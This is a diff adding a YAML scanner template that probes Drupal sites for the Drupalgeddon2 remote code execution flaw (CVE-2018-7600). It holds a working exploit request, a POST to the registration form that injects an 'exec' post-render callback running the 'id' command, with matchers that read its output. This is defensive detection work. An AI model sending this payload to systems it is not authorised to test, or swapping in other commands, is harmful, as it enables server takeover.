@@ -1,0 +1,17 @@
+name: Drupalgeddon2 CVE-2018-7600 Detection
+description: Probes for the Drupalgeddon2 remote code execution vulnerability (CVE-2018-7600) affecting Drupal 6, 7, and 8. The vulnerability allows unauthenticated attackers to execute arbitrary PHP code via the user registration form.
+severity: critical
+cwe: CWE-74
+
+requests:
+  - method: POST
+    path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
+
+matchers:
+  - body_contains: "uid="
+  - body_contains: "gid="
+  - regex: "uid=[0-9]+\\(.*\\)"
+  - status_code: 200
